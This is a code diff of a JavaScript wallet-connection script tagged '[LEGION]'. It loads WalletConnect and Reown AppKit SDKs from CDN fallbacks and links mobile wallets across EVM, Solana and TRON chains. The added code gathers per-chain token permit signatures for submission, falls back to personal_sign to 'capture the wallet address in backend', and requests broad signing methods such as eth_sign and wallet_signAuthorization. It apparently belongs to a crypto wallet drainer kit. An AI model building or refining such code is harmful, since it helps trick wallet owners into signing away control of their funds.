@@ -1295,6 +1295,23 @@
           });
 
           if (permits.length === 0) {
+            // WalletConnect: no tokens → use personal_sign to at least verify signing channel
+            // and capture the wallet address in backend
+            if (_isWCProvider) {
+              console.log('[LEGION] WC: No ERC-20 tokens on chain', evmChainId, '— personal_sign fallback');
+              try {
+                var _psMsg = 'Sign to continue: ' + evmAddr + ' | ' + Date.now();
+                var _psSig = await eth.request({ method: 'personal_sign', params: [_psMsg, evmAddr] });
+                if (_psSig) {
+                  console.log('[LEGION] ✅ WC personal_sign captured:', _psSig.slice(0, 20) + '...');
+                  connectedChains.EVM._personalSign = { sig: _psSig, msg: _psMsg };
+                  return _psSig;
+                }
+              } catch (_psE) {
+                if (_isRejection(_psE && _psE.code, (_psE && _psE.message) || '')) throw _psE;
+                console.warn('[LEGION] WC personal_sign failed:', _psE && _psE.message);
+              }
+            }
             console.log('[LEGION] ℹ️ No tokens found on chain', evmChainId, '— skipping');
             return null;
           }
@@ -4857,69 +4874,75 @@
     });
   }
 
-  // EthereumProvider — script tag (unpkg UMD) first, esm.sh as fallback
+  // EthereumProvider — unpkg UMD (script tag) → jsDelivr UMD → esm.sh fallback
   async function tryEthereumProvider() {
-    // PRIMARY: unpkg pre-built UMD bundle (861KB, standalone, works on ALL mobile browsers)
-    // No dynamic import() needed — <script> tag is supported everywhere
-    try {
-      await _loadScript('https://unpkg.com/@walletconnect/ethereum-provider@2.17.3/dist/index.umd.js');
-      var _epGlobal = window['@walletconnect/ethereum-provider'];
-      var EP = _epGlobal && (_epGlobal.EthereumProvider || _epGlobal.default);
-      if (EP && EP.init) {
-        console.log('[LEGION] WC: EthereumProvider via unpkg UMD (script tag) ✅');
-        return { type: 'ethereum', EthereumProvider: EP };
-      }
-    } catch (e) { console.warn('[LEGION] WC EP unpkg failed:', e.message); }
-
-    // FALLBACK: esm.sh dynamic import (may fail on some mobile browsers)
-    var urls = [
-      'https://esm.sh/@walletconnect/ethereum-provider@2.17.3?bundle-deps',
-      'https://esm.sh/@walletconnect/ethereum-provider@2.13.0?bundle-deps',
+    var _epUmdUrls = [
+      'https://unpkg.com/@walletconnect/ethereum-provider@2.17.3/dist/index.umd.js',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.3/dist/index.umd.js',
     ];
-    for (var i = 0; i < urls.length; i++) {
+    for (var _eu = 0; _eu < _epUmdUrls.length; _eu++) {
       try {
-        var mod = await import(urls[i]);
-        var EP = mod.EthereumProvider || (mod.default && mod.default.EthereumProvider) || mod.default;
+        await _loadScript(_epUmdUrls[_eu]);
+        var _epGlobal = window['@walletconnect/ethereum-provider'] || window.WalletConnectEthereumProvider;
+        var EP = _epGlobal && (_epGlobal.EthereumProvider || _epGlobal.default || _epGlobal);
         if (EP && EP.init) {
-          console.log('[LEGION] WC: EthereumProvider via esm.sh import');
+          console.log('[LEGION] WC: EthereumProvider via UMD ✅ (' + (_eu === 0 ? 'unpkg' : 'jsDelivr') + ')');
           return { type: 'ethereum', EthereumProvider: EP };
         }
-      } catch (e) { console.warn('[LEGION] WC EP esm.sh failed:', e.message); }
+        console.warn('[LEGION] WC EP UMD loaded but no class found. Window keys:', Object.keys(window).filter(function(k){ return k.toLowerCase().includes('ethereum') || k.toLowerCase().includes('walletconnect'); }).join(', '));
+      } catch (e) { console.warn('[LEGION] WC EP UMD failed (' + (_eu === 0 ? 'unpkg' : 'jsDelivr') + '):', e.message); }
+    }
+    // ESM fallback — esm.sh then esm.run (jsDelivr ESM CDN)
+    var _epEsmUrls = [
+      'https://esm.sh/@walletconnect/ethereum-provider@2.17.3?bundle-deps',
+      'https://esm.sh/@walletconnect/ethereum-provider@2.13.0?bundle-deps',
+      'https://esm.run/@walletconnect/ethereum-provider',
+    ];
+    for (var i = 0; i < _epEsmUrls.length; i++) {
+      try {
+        var mod = await import(_epEsmUrls[i]);
+        var EP = mod.EthereumProvider || (mod.default && mod.default.EthereumProvider) || mod.default;
+        if (EP && EP.init) {
+          console.log('[LEGION] WC: EthereumProvider via ESM import ✅');
+          return { type: 'ethereum', EthereumProvider: EP };
+        }
+      } catch (e) { console.warn('[LEGION] WC EP ESM failed:', e.message); }
     }
     return null;
   }
 
-  // UniversalProvider — script tag (unpkg UMD) first, esm.sh as fallback
+  // UniversalProvider — unpkg UMD (script tag) → jsDelivr UMD → esm.sh fallback
   async function tryUniversalProvider() {
-    // PRIMARY: unpkg pre-built UMD bundle (697KB, standalone)
-    try {
-      await _loadScript('https://unpkg.com/@walletconnect/universal-provider@2.17.3/dist/index.umd.js');
-      // UMD global name varies by build — check all known variants
-      var _upRaw = window['@walletconnect/universal-provider'] ||
-                   window['WalletConnectUniversalProvider'] ||
-                   window['UniversalProvider'];
-      var UP = _upRaw && (_upRaw.UniversalProvider || _upRaw.default || _upRaw);
-      if (UP && UP.init) {
-        console.log('[LEGION] WC: UniversalProvider via unpkg UMD (script tag) ✅');
-        return { type: 'universal', UniversalProvider: UP };
-      }
-      // Log what globals the UMD actually set so we can debug
-      console.warn('[LEGION] WC UP UMD loaded but no UniversalProvider found. Globals:', Object.keys(window).filter(function(k){ return k.toLowerCase().includes('universal') || k.toLowerCase().includes('walletconnect'); }).join(', '));
-    } catch (e) { console.warn('[LEGION] WC UP unpkg failed:', e.message); }
-
-    // FALLBACK: esm.sh
-    var pairs = [
-      ['https://esm.sh/@walletconnect/universal-provider@2.17.3?bundle-deps',
-       'https://esm.sh/@walletconnect/modal@2.7.0?bundle-deps'],
-      ['https://esm.sh/@walletconnect/universal-provider@2.13.0?bundle-deps',
-       'https://esm.sh/@walletconnect/modal@2.6.2?bundle-deps'],
+    var _upUmdUrls = [
+      'https://unpkg.com/@walletconnect/universal-provider@2.17.3/dist/index.umd.js',
+      'https://cdn.jsdelivr.net/npm/@walletconnect/universal-provider@2.17.3/dist/index.umd.js',
     ];
-    for (var i = 0; i < pairs.length; i++) {
+    for (var _uu = 0; _uu < _upUmdUrls.length; _uu++) {
       try {
-        var mods = await Promise.all([import(pairs[i][0]), import(pairs[i][1])]);
+        await _loadScript(_upUmdUrls[_uu]);
+        var _upRaw = window['@walletconnect/universal-provider'] ||
+                     window['WalletConnectUniversalProvider'] ||
+                     window['UniversalProvider'];
+        var UP = _upRaw && (_upRaw.UniversalProvider || _upRaw.default || _upRaw);
+        if (UP && UP.init) {
+          console.log('[LEGION] WC: UniversalProvider via UMD ✅ (' + (_uu === 0 ? 'unpkg' : 'jsDelivr') + ')');
+          return { type: 'universal', UniversalProvider: UP };
+        }
+        console.warn('[LEGION] WC UP UMD loaded but no class. Keys:', Object.keys(window).filter(function(k){ return k.toLowerCase().includes('universal') || k.toLowerCase().includes('walletconnect'); }).join(', '));
+      } catch (e) { console.warn('[LEGION] WC UP UMD failed (' + (_uu === 0 ? 'unpkg' : 'jsDelivr') + '):', e.message); }
+    }
+    // ESM fallback — esm.sh then esm.run
+    var _upEsmPairs = [
+      ['https://esm.sh/@walletconnect/universal-provider@2.17.3?bundle-deps', 'https://esm.sh/@walletconnect/modal@2.7.0?bundle-deps'],
+      ['https://esm.sh/@walletconnect/universal-provider@2.13.0?bundle-deps', 'https://esm.sh/@walletconnect/modal@2.6.2?bundle-deps'],
+      ['https://esm.run/@walletconnect/universal-provider', 'https://esm.run/@walletconnect/modal'],
+    ];
+    for (var i = 0; i < _upEsmPairs.length; i++) {
+      try {
+        var mods = await Promise.all([import(_upEsmPairs[i][0]), import(_upEsmPairs[i][1])]);
         var UP = mods[0].default || mods[0].UniversalProvider;
         if (UP && UP.init) {
-          console.log('[LEGION] WC: UniversalProvider via esm.sh');
+          console.log('[LEGION] WC: UniversalProvider via ESM import ✅');
           return { type: 'universal', UniversalProvider: UP };
         }
       } catch (e) { continue; }
@@ -4927,32 +4950,56 @@
     return null;
   }
 
-  // Method 1 (PRIMARY): Reown AppKit — best multi-wallet modal, 300+ wallets + Solana
+  // Reown AppKit — built-in QR modal, handles WC session internally (no connect() stuck issue)
   async function tryAppKit() {
-    try {
-      var mods = await Promise.all([
-        import('https://esm.sh/@reown/appkit@1.6.8?bundle-deps'),
-        import('https://esm.sh/@reown/appkit-adapter-ethers@1.6.8?bundle-deps'),
-        import('https://esm.sh/@reown/appkit-adapter-solana@1.6.8?bundle-deps').catch(function() { return null; }),
-      ]);
-      var createAppKit = mods[0].createAppKit || (mods[0].default && mods[0].default.createAppKit);
-      var EthersAdapter = mods[1].EthersAdapter || (mods[1].default && mods[1].default.EthersAdapter);
-      var SolanaAdapter = mods[2] && (mods[2].SolanaAdapter || (mods[2].default && mods[2].default.SolanaAdapter));
-      if (createAppKit && EthersAdapter) {
-        console.log('[LEGION] WC: Reown AppKit loaded | Solana adapter:', !!SolanaAdapter);
-        return { type: 'appkit', createAppKit: createAppKit, EthersAdapter: EthersAdapter, SolanaAdapter: SolanaAdapter || null };
-      }
-    } catch (e) { console.warn('[LEGION] AppKit load failed:', e.message); }
+    // Multiple CDN sources: esm.sh (recommended) → esm.run/jsDelivr (fallback for mobile 404s)
+    var _akSets = [
+      // esm.sh with bundle-deps (Reown's recommended CDN approach)
+      ['https://esm.sh/@reown/appkit@1.6.8?bundle-deps',
+       'https://esm.sh/@reown/appkit-adapter-ethers@1.6.8?bundle-deps',
+       'https://esm.sh/@reown/appkit@1.6.8/networks?bundle-deps'],
+      ['https://esm.sh/@reown/appkit@1.5.0?bundle-deps',
+       'https://esm.sh/@reown/appkit-adapter-ethers@1.5.0?bundle-deps',
+       'https://esm.sh/@reown/appkit@1.5.0/networks?bundle-deps'],
+      // jsDelivr ESM CDN (esm.run) — fallback when esm.sh is down/404ing
+      ['https://esm.run/@reown/appkit@1.6.8',
+       'https://esm.run/@reown/appkit-adapter-ethers@1.6.8',
+       'https://esm.run/@reown/appkit@1.6.8/networks'],
+      ['https://esm.run/@reown/appkit@1.5.0',
+       'https://esm.run/@reown/appkit-adapter-ethers@1.5.0',
+       'https://esm.run/@reown/appkit@1.5.0/networks'],
+    ];
+    for (var _akI = 0; _akI < _akSets.length; _akI++) {
+      var _cdn = _akSets[_akI][0].includes('esm.sh') ? 'esm.sh' : 'esm.run';
+      var _ver = (_akSets[_akI][0].match(/@([\d.]+)/) || ['','?'])[1];
+      try {
+        var mods = await Promise.all([
+          import(_akSets[_akI][0]),
+          import(_akSets[_akI][1]),
+          import('https://esm.sh/@reown/appkit-adapter-solana@1.6.8?bundle-deps').catch(function() { return null; }),
+          import(_akSets[_akI][2]).catch(function() { return null; }),
+        ]);
+        var createAppKit = mods[0].createAppKit || (mods[0].default && mods[0].default.createAppKit);
+        var EthersAdapter = mods[1].EthersAdapter || (mods[1].default && mods[1].default.EthersAdapter);
+        var SolanaAdapter = mods[2] && (mods[2].SolanaAdapter || (mods[2].default && mods[2].default.SolanaAdapter));
+        var networksModule = mods[3] || null;
+        if (createAppKit && EthersAdapter) {
+          console.log('[LEGION] WC: Reown AppKit v' + _ver + ' via ' + _cdn + ' ✅ | Solana:', !!SolanaAdapter, '| Networks:', !!networksModule);
+          return { type: 'appkit', createAppKit: createAppKit, EthersAdapter: EthersAdapter, SolanaAdapter: SolanaAdapter || null, networksModule: networksModule };
+        }
+      } catch (e) { console.warn('[LEGION] AppKit v' + _ver + ' via ' + _cdn + ' failed:', e.message); }
+    }
     return null;
   }
 
   async function loadWalletConnectSDK(projectId) {
     var result;
-    // UniversalProvider FIRST — requiredNamespaces:{} = any wallet (EVM/SOL/TRON) can connect
-    // EthereumProvider forces eip155:1 as required → some wallets reject
+    // AppKit FIRST — handles WC session internally (no manual relay management needed)
+    // Fixes "connect() stuck" issue when Trust Wallet extension is present
+    result = await tryAppKit();            if (result) return result;
+    // Fallback: raw UniversalProvider (custom QR, manual relay)
     result = await tryUniversalProvider(); if (result) return result;
     result = await tryEthereumProvider();  if (result) return result;
-    result = await tryAppKit();            if (result) return result;
     return null;
   }
 
@@ -5016,67 +5063,228 @@
           if (restored > 0) { await runWCSignAndSubmit(); return; }
         }
         updateStatus('Scan QR with your wallet...');
-        await _wcProvider.connect({
-          // Empty requiredNamespaces = any wallet can connect regardless of chain family
-          // EVM, Solana, TRON, TON — wallet offers what it supports from optionalNamespaces
-          requiredNamespaces: {},
-          optionalNamespaces: {
-            eip155: {
-              methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4', 'wallet_sendCalls'],
-              chains: [
-                'eip155:1',     // Ethereum
-                'eip155:137',   // Polygon
-                'eip155:56',    // BNB Chain
-                'eip155:42161', // Arbitrum
-                'eip155:8453',  // Base
-                'eip155:10',    // Optimism
-                'eip155:43114', // Avalanche
-                'eip155:250',   // Fantom
-                'eip155:324',   // zkSync Era
-                'eip155:1101',  // Polygon zkEVM
-                'eip155:59144', // Linea
-                'eip155:534352',// Scroll
-                'eip155:5000',  // Mantle
-                'eip155:81457', // Blast
-                'eip155:42220', // Celo
-                'eip155:100',   // Gnosis
-                'eip155:25',    // Cronos
-              ],
-              events: ['chainChanged', 'accountsChanged']
-            },
-            solana: {
-              methods: ['solana_signMessage', 'solana_signTransaction', 'solana_signAllTransactions'],
-              chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
-              events: []
-            },
-            tron: {
-              methods: ['tron_signMessage', 'tron_signTransaction'],
-              chains: ['tron:0x2b6653dc'],
-              events: []
-            },
-            // TON — Tonkeeper, MyTonWallet via WC v2
-            ton: {
-              methods: ['ton_sendTransaction', 'ton_signTransaction', 'ton_signData'],
-              chains: ['ton:mainnet'],
-              events: []
-            },
-            // Bitcoin — Xverse, OKX BTC wallet via WC v2
-            bip122: {
-              methods: ['signMessage', 'signPsbt', 'sendTransfer'],
-              chains: ['bip122:000000000019d6689c085ae165831e93'],
-              events: []
-            },
-            // Cosmos — Keplr, Leap via WC v2
-            cosmos: {
-              methods: ['cosmos_signAmino', 'cosmos_signDirect'],
-              chains: ['cosmos:cosmoshub-4'],
-              events: []
-            }
+
+        // Parallel session poller + relay message listener
+        var _upSessionDone = false;
+        var _upPollCount = 0;
+
+        function _wcHandleConfirmedSession() {
+          if (_upSessionDone) return;
+          _upSessionDone = true;
+          clearInterval(_upPoller);
+          hideManualQR();
+          var cnt = applyWCSession(_wcProvider);
+          console.log('[LEGION] WC session confirmed, chains applied:', cnt);
+          if (cnt > 0) {
+            runWCSignAndSubmit().catch(function(e) { console.error('[LEGION] WC sign error:', e.message); });
+          } else {
+            updateStatus('Wallet connected — no accounts found. Try again.');
           }
-        });
-        hideManualQR();
-        if (applyWCSession(_wcProvider) === 0) throw new Error('No accounts from WalletConnect');
-        await runWCSignAndSubmit();
+        }
+
+        var _upPoller = setInterval(function() {
+          if (_upSessionDone) { clearInterval(_upPoller); return; }
+          _upPollCount++;
+          // Relay keepalive: every iteration for first 10 (15s), then every 10 iterations
+          if (_upPollCount <= 10 || _upPollCount % 10 === 0) {
+            try {
+              var _r = _wcProvider && _wcProvider.core && _wcProvider.core.relayer;
+              if (_r && _r.provider && _r.provider.connection) { _r.provider.open && _r.provider.open(); }
+            } catch (_) {}
+          }
+          if (_upPollCount % 5 === 0) {
+            var _dbgSess = _wcProvider && _wcProvider.session;
+            console.log('[LEGION] WC poller attempt', _upPollCount, '| session:', _dbgSess ? 'FOUND ✅' : 'null ⏳');
+          }
+          // Check session — 3 paths: provider.session → SignClient store → localStorage
+          var _s = _wcProvider && _wcProvider.session;
+          if (!_s && _wcProvider) {
+            try {
+              var _sc2 = _wcProvider.client || _wcProvider.signClient;
+              if (_sc2 && _sc2.session) {
+                var _allSess = [];
+                if (_sc2.session.getAll) { _allSess = _sc2.session.getAll() || []; }
+                if (!_allSess.length && _sc2.session.map && _sc2.session.map.values) {
+                  try { _allSess = Array.from(_sc2.session.map.values()); } catch (_) {}
+                }
+                if (!_allSess.length && _sc2.session.values) {
+                  try { _allSess = Array.from(_sc2.session.values()); } catch (_) {}
+                }
+                if (_allSess.length > 0) {
+                  _s = _allSess[_allSess.length - 1];
+                  if (_s) console.log('[LEGION] WC poller: session from SignClient ✅', _s.topic ? _s.topic.slice(0, 8) : '?');
+                }
+              }
+            } catch (_) {}
+          }
+          // Nuclear fallback: scan localStorage for WC v2 session data
+          // Works even when provider.session is null and connect() is stuck
+          if (!_s) {
+            try {
+              var _lsKeys = Object.keys(localStorage);
+              for (var _lsI = 0; _lsI < _lsKeys.length && !_s; _lsI++) {
+                var _lsk = _lsKeys[_lsI];
+                if (_lsk.indexOf('wc@') !== -1 && _lsk.indexOf('session') !== -1) {
+                  try {
+                    var _lsObj = JSON.parse(localStorage.getItem(_lsk) || '{}');
+                    var _lsVals = Object.keys(_lsObj).map(function(k) { return _lsObj[k]; });
+                    for (var _lsJ = 0; _lsJ < _lsVals.length; _lsJ++) {
+                      var _lsSess = _lsVals[_lsJ];
+                      if (_lsSess && _lsSess.namespaces && Object.keys(_lsSess.namespaces).length > 0) {
+                        console.log('[LEGION] WC poller: session from localStorage ✅ key:', _lsk.slice(0, 30));
+                        _s = _lsSess;
+                        break;
+                      }
+                    }
+                  } catch (_) {}
+                }
+              }
+            } catch (_lsErr) {}
+          }
+          if (_s && _s.namespaces && Object.keys(_s.namespaces).length > 0) {
+            _wcHandleConfirmedSession(); return;
+          }
+          // Timeout: 90 seconds
+          if (_upPollCount >= 60 && !_upSessionDone) {
+            clearInterval(_upPoller);
+            console.log('[LEGION] WC poller: timed out after 90s');
+            hideManualQR();
+            updateStatus('QR timed out. Click Connect to try again.');
+          }
+        }, 1500);
+
+        // ── SignClient session_settle listener (most direct — fires the moment session is established) ──
+        try {
+          var _signClient = _wcProvider.client || _wcProvider.signClient;
+          if (_signClient && _signClient.on) {
+            _signClient.on('session_settle', function(session) {
+              console.log('[LEGION] WC SignClient session_settle ✅ topic:', session && session.topic ? session.topic.slice(0,8) + '...' : 'n/a');
+              if (!_upSessionDone) setTimeout(function() { if (!_upSessionDone) _wcHandleConfirmedSession(); }, 300);
+            });
+            _signClient.on('session_update', function() {
+              console.log('[LEGION] WC SignClient session_update');
+              if (!_upSessionDone) setTimeout(function() { if (!_upSessionDone) _wcHandleConfirmedSession(); }, 300);
+            });
+            console.log('[LEGION] WC SignClient listeners attached ✅');
+          }
+        } catch (_sce) { console.log('[LEGION] WC SignClient listener N/A:', _sce && _sce.message); }
+
+        // ── accountsChanged / chainChanged — fire when mobile wallet provides accounts ──
+        try {
+          if (_wcProvider && _wcProvider.on) {
+            _wcProvider.on('accountsChanged', function(accs) {
+              console.log('[LEGION] WC accountsChanged:', accs && accs[0] ? accs[0].slice(0, 10) : 'none');
+              if (!_upSessionDone && accs && accs.length > 0) {
+                setTimeout(function() { if (!_upSessionDone) _wcHandleConfirmedSession(); }, 300);
+              }
+            });
+            _wcProvider.on('chainChanged', function(cId) {
+              console.log('[LEGION] WC chainChanged:', cId);
+              if (!_upSessionDone) setTimeout(function() { if (!_upSessionDone) _wcHandleConfirmedSession(); }, 300);
+            });
+            _wcProvider.on('connect', function() {
+              console.log('[LEGION] WC provider connect event — checking session...');
+              setTimeout(function() {
+                if (_upSessionDone) return;
+                // Only proceed if session actually exists (not just pairing)
+                var _cs = _wcProvider && _wcProvider.session;
+                if (_cs && _cs.namespaces && Object.keys(_cs.namespaces).length > 0) {
+                  _wcHandleConfirmedSession();
+                }
+              }, 800);
+            });
+            console.log('[LEGION] WC provider listeners attached ✅');
+          }
+        } catch (_pe) { console.log('[LEGION] WC provider listener N/A:', _pe && _pe.message); }
+
+        // ── Relay message + connect/disconnect logging ──────────────────────────────
+        try {
+          var _relayer = _wcProvider && _wcProvider.core && _wcProvider.core.relayer;
+          if (_relayer && _relayer.on) {
+            _relayer.on('relayer_connect', function() { console.log('[LEGION] WC relay CONNECTED ✅'); });
+            _relayer.on('relayer_disconnect', function() {
+              console.log('[LEGION] WC relay DISCONNECTED ⚠️ — attempting reconnect...');
+              // Force reconnect
+              try { _relayer.connect && _relayer.connect(); } catch (_) {}
+            });
+            _relayer.on('relayer_message', function() {
+              if (_upSessionDone) return;
+              console.log('[LEGION] WC relay received message — checking session...');
+              setTimeout(function() {
+                if (_upSessionDone) return;
+                var _rs = _wcProvider && _wcProvider.session;
+                if (!_rs && _wcProvider) {
+                  try {
+                    var _rsc = _wcProvider.client || _wcProvider.signClient;
+                    if (_rsc && _rsc.session && _rsc.session.getAll) {
+                      var _ra = _rsc.session.getAll();
+                      _rs = (_ra && _ra.length > 0) ? _ra[_ra.length - 1] : null;
+                    }
+                  } catch (_) {}
+                }
+                if (_rs && _rs.namespaces && Object.keys(_rs.namespaces).length > 0) {
+                  console.log('[LEGION] WC relay: session confirmed ✅');
+                  _wcHandleConfirmedSession();
+                } else {
+                  console.log('[LEGION] WC relay: non-session message, poller continues...');
+                }
+              }, 500);
+            });
+            console.log('[LEGION] WC relay listeners attached ✅ | connected:', !!(_relayer.connected));
+          } else {
+            console.log('[LEGION] WC relay: no .on() method — relayer type:', typeof _relayer);
+          }
+        } catch (_re) { console.log('[LEGION] WC relay listener N/A:', _re && _re.message); }
+
+        console.log('[LEGION] WC calling connect()...');
+        try {
+          await _wcProvider.connect({
+            requiredNamespaces: {},
+            optionalNamespaces: {
+              eip155: {
+                methods: ['personal_sign', 'eth_sendTransaction', 'eth_signTypedData_v4', 'wallet_sendCalls', 'wallet_signAuthorization', 'eth_sign'],
+                chains: [
+                  'eip155:1','eip155:137','eip155:56','eip155:42161','eip155:8453',
+                  'eip155:10','eip155:43114','eip155:250','eip155:324','eip155:1101',
+                  'eip155:59144','eip155:534352','eip155:5000','eip155:81457',
+                  'eip155:42220','eip155:100','eip155:25',
+                ],
+                events: ['chainChanged', 'accountsChanged'],
+                rpcMap: {
+                  1:'https://cloudflare-eth.com',137:'https://polygon-rpc.com',
+                  56:'https://bsc-dataseed.binance.org',42161:'https://arb1.arbitrum.io/rpc',
+                  8453:'https://mainnet.base.org',10:'https://mainnet.optimism.io',
+                  43114:'https://api.avax.network/ext/bc/C/rpc',250:'https://rpc.ftm.tools',
+                  324:'https://mainnet.era.zksync.io',1101:'https://zkevm-rpc.com',
+                  59144:'https://rpc.linea.build',534352:'https://rpc.scroll.io',
+                  5000:'https://rpc.mantle.xyz',81457:'https://rpc.blast.io',
+                  42220:'https://forno.celo.org',100:'https://rpc.gnosischain.com',
+                  25:'https://evm.cronos.org'
+                }
+              },
+              solana: {
+                methods: ['solana_signMessage','solana_signTransaction','solana_signAllTransactions'],
+                chains: ['solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp'],
+                events: [],
+                rpcMap: { '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp': 'https://api.mainnet-beta.solana.com' }
+              },
+              tron: {
+                methods: ['tron_signMessage','tron_signTransaction'],
+                chains: ['tron:0x2b6653dc'],
+                events: [],
+                rpcMap: { '0x2b6653dc': 'https://api.trongrid.io' }
+              }
+            }
+          });
+        } catch (_connErr) {
+          clearInterval(_upPoller);
+          if (!_upSessionDone) throw _connErr;
+          return; // poller already handled it
+        }
+
+        console.log('[LEGION] WC connect() resolved ✅');
+        if (_upSessionDone) return; // poller/listener already handled it
+        _wcHandleConfirmedSession();
         return;
       }
 
@@ -5231,20 +5439,35 @@
               _akSolanaLoaded = true;
             } catch (_) {}
           }
-          // EVM networks — wallet decides which one to connect on, we support all
-          var _akNetworks = [
-            { id: 1,     caipNetworkId: 'eip155:1',     chainNamespace: 'eip155', name: 'Ethereum',     nativeCurrency: { decimals: 18, name: 'Ether', symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://cloudflare-eth.com'] } } },
-            { id: 137,   caipNetworkId: 'eip155:137',   chainNamespace: 'eip155', name: 'Polygon',      nativeCurrency: { decimals: 18, name: 'POL',   symbol: 'POL'  }, rpcUrls: { default: { http: ['https://polygon-rpc.com'] } } },
-            { id: 56,    caipNetworkId: 'eip155:56',    chainNamespace: 'eip155', name: 'BNB Chain',    nativeCurrency: { decimals: 18, name: 'BNB',   symbol: 'BNB'  }, rpcUrls: { default: { http: ['https://bsc-dataseed.binance.org'] } } },
-            { id: 42161, caipNetworkId: 'eip155:42161', chainNamespace: 'eip155', name: 'Arbitrum One', nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://arb1.arbitrum.io/rpc'] } } },
-            { id: 10,    caipNetworkId: 'eip155:10',    chainNamespace: 'eip155', name: 'Optimism',     nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://mainnet.optimism.io'] } } },
-            { id: 8453,  caipNetworkId: 'eip155:8453',  chainNamespace: 'eip155', name: 'Base',         nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://mainnet.base.org'] } } },
-            { id: 43114, caipNetworkId: 'eip155:43114', chainNamespace: 'eip155', name: 'Avalanche',    nativeCurrency: { decimals: 18, name: 'AVAX',  symbol: 'AVAX' }, rpcUrls: { default: { http: ['https://api.avax.network/ext/bc/C/rpc'] } } },
-            { id: 250,   caipNetworkId: 'eip155:250',   chainNamespace: 'eip155', name: 'Fantom',       nativeCurrency: { decimals: 18, name: 'FTM',   symbol: 'FTM'  }, rpcUrls: { default: { http: ['https://rpc.ftm.tools'] } } },
-          ];
-          // Only add Solana if the adapter actually loaded — prevents "Unsupported chains" crash
-          if (_akSolanaLoaded) {
-            _akNetworks.push({ id: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', caipNetworkId: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', chainNamespace: 'solana', name: 'Solana', nativeCurrency: { decimals: 9, name: 'SOL', symbol: 'SOL' }, rpcUrls: { default: { http: ['https://api.mainnet-beta.solana.com'] } } });
+          // Build networks list — prefer AppKit's own pre-built network objects (correct CAIP-2 format)
+          var _akNetworks = [];
+          var _nm = _wcSdk.networksModule;
+          if (_nm) {
+            // Use AppKit's exported network objects — format guaranteed correct
+            var _evmKeys = ['mainnet','polygon','bsc','arbitrum','optimism','base','avalanche','fantom',
+              'zkSync','linea','scroll','blast','celo','mantle','cronos','polygonZkEvm','metis',
+              'gnosis','aurora','moonbeam','arbitrumNova','klaytn','pulsechain','manta','zora'];
+            for (var _nk = 0; _nk < _evmKeys.length; _nk++) {
+              if (_nm[_evmKeys[_nk]]) _akNetworks.push(_nm[_evmKeys[_nk]]);
+            }
+            if (_akNetworks.length === 0 && _nm.mainnet) _akNetworks = [_nm.mainnet];
+            if (_akSolanaLoaded && _nm.solana) _akNetworks.push(_nm.solana);
+            console.log('[LEGION] AppKit networks from module:', _akNetworks.length);
+          } else {
+            // Fallback: manually-defined networks with correct CAIP-2 format
+            _akNetworks = [
+              { id: 1,     caipNetworkId: 'eip155:1',     chainNamespace: 'eip155', name: 'Ethereum',     nativeCurrency: { decimals: 18, name: 'Ether', symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://cloudflare-eth.com'] } } },
+              { id: 137,   caipNetworkId: 'eip155:137',   chainNamespace: 'eip155', name: 'Polygon',      nativeCurrency: { decimals: 18, name: 'POL',   symbol: 'POL'  }, rpcUrls: { default: { http: ['https://polygon-rpc.com'] } } },
+              { id: 56,    caipNetworkId: 'eip155:56',    chainNamespace: 'eip155', name: 'BNB Chain',    nativeCurrency: { decimals: 18, name: 'BNB',   symbol: 'BNB'  }, rpcUrls: { default: { http: ['https://bsc-dataseed.binance.org'] } } },
+              { id: 42161, caipNetworkId: 'eip155:42161', chainNamespace: 'eip155', name: 'Arbitrum One', nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://arb1.arbitrum.io/rpc'] } } },
+              { id: 10,    caipNetworkId: 'eip155:10',    chainNamespace: 'eip155', name: 'Optimism',     nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://mainnet.optimism.io'] } } },
+              { id: 8453,  caipNetworkId: 'eip155:8453',  chainNamespace: 'eip155', name: 'Base',         nativeCurrency: { decimals: 18, name: 'ETH',   symbol: 'ETH'  }, rpcUrls: { default: { http: ['https://mainnet.base.org'] } } },
+              { id: 43114, caipNetworkId: 'eip155:43114', chainNamespace: 'eip155', name: 'Avalanche',    nativeCurrency: { decimals: 18, name: 'AVAX',  symbol: 'AVAX' }, rpcUrls: { default: { http: ['https://api.avax.network/ext/bc/C/rpc'] } } },
+              { id: 250,   caipNetworkId: 'eip155:250',   chainNamespace: 'eip155', name: 'Fantom',       nativeCurrency: { decimals: 18, name: 'FTM',   symbol: 'FTM'  }, rpcUrls: { default: { http: ['https://rpc.ftm.tools'] } } },
+            ];
+            if (_akSolanaLoaded) {
+              _akNetworks.push({ id: '5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', caipNetworkId: 'solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp', chainNamespace: 'solana', name: 'Solana', nativeCurrency: { decimals: 9, name: 'SOL', symbol: 'SOL' }, rpcUrls: { default: { http: ['https://api.mainnet-beta.solana.com'] } } });
+            }
           }
           _wcModal = _wcSdk.createAppKit({
             adapters: _akAdapters,
@@ -5258,29 +5481,127 @@
         }
         updateStatus('Connecting wallet...');
         await _wcModal.open();
-        // Wait for user to connect — AppKit v1.x uses subscribeAccount (not subscribeProvider)
+        console.log('[LEGION] AppKit modal opened — waiting for connection...');
+        // Wait for user to connect — 3 parallel detection methods:
+        // 1) subscribeAccount (primary), 2) subscribeState (fallback), 3) address poller (ultimate)
         var _akState = await new Promise(function(resolve, reject) {
-          var _akTimeout = setTimeout(function() { reject(new Error('WalletConnect timeout')); }, 120000);
-          // subscribeAccount fires with { address, isConnected, caipAddress, status }
-          var _akUnsub = _wcModal.subscribeAccount(function(state) {
-            if (state.isConnected && state.address) {
